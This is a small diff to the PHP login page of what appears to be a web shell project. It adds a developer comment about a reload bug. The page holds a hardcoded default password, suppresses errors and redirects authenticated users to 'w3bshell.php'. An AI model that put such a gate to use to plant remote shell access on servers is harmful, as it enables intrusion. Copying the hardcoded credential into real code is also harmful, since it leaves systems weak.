@@ -3,6 +3,8 @@ session_start();
 error_reporting(0);
 
 $password = "youStrongPa88word"; // Customizeable
+// NOTE: after typing the password correct and submitting reload the page, I will try fixing this but currently have no idea why is this happening
+
 
 if (isset($_SESSION["status"]) && $_SESSION["status"]==="loggedin") {
   die(header('Location: w3bshell.php'));
